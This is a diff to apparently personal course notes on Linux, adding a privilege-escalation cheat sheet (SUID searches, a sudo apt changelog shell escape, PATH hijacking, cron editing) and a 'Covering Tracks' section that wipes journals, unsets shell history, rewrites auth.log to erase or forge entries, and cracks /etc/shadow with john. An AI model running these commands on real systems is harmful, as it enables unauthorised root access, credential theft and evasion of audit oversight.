@@ -570,7 +570,7 @@ ps -auf
 
 pstree
 -shows entire process tree
-
+192.168.28.96
 sudo lsof 
 -shows open files on system
 
@@ -674,6 +674,135 @@ ssh -M -S ~/.ssh/cm/T1 comrade@0.0.0.0 -p 2222
 scp -o "ControlPath=~/.ssh/cm/gray": placeholder:/home/student/func
 -scp using multiplex
 
+
+ LINUX PRIVILEGE ESCELATION
+  -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+  
+  sudo -l
+  -look for commands allowed
+  
+  
+  find /-type f -perm /4000 -ls 2>/dev/null
+  -finds files run as root
+  -2000 for SGID
+  -6000 for both 
+  
+  
+  search gtfo bins
+  -allows you to escalate based on binaries
+  
+sudo apt-get changelog apt
+!/bin/sh
+
+-grants root access
+
+
+
+World Writables directories 
+/tmp
+/var/tmp
+
+Can modify the $PATH varible with a . to execute from the working directory a fake program 
+
+MAKE A BACKUP $PATH VARIBLE
+
+PATH=.:$PATH
+
+make a script and chomd +x
+
+
+CRON manipulation
+
+ls /etc/cron
+-scripts that run at certain times you may be able to edit
+
+cat /etc/crontab
+-jobs secheduled
+
+crontab -l 
+-shows user cronjobs
+
+
+
+AUDITUNG
+
+SYSV
+ausearch -p 22
+ausearch -m USER_LOGAIN -sv no
+ausearch -ua edwards -ts yesterday -te now -i
+
+SYSTEMD
+journalctl _TRANSPORT=audit
+journalctl _TRANSPORT=audit | grep 603
+
+journalctl -f
+-system level
+
+journalctl --vacuum-time=10m
+-clean the last 10min
+
+Covering Tracks
+
+auth.log/secure
+
+Logins/authentications
+
+lastlog
+
+Each users' last successful login time
+
+btmp
+
+Bad login attempts
+
+sulog
+
+Usage of SU command
+
+utmp
+
+Currently logged in users (W command)
+
+wtmp
+
+Permanent record on user on/off
+
+
+cat $HISTFILE
+
+echo " " $HISTFILE
+
+unset HISTFILE
+
+
+
+cat /var/log/auth.log | egrep -v "opened|closed"
+awk '/opened/' /var/log/auth.log
+last OR lastb OR lastlog
+strings OR dd            # for data files
+more /var/log/syslog
+head/tail
+
+
+
+Specific log cleaning
+
+egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2 +
+
+cp auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log +
+
+
+
+/etc/rsyslog.d/*
+
+/etc/rsyslog.conf`
+
+grep "IncludeConfig" /etc/rsyslog.conf
+
+
+cat /etc/shadow
+
+john --wordlist=Mywordlist.txt shadowfilehere
 
 
 
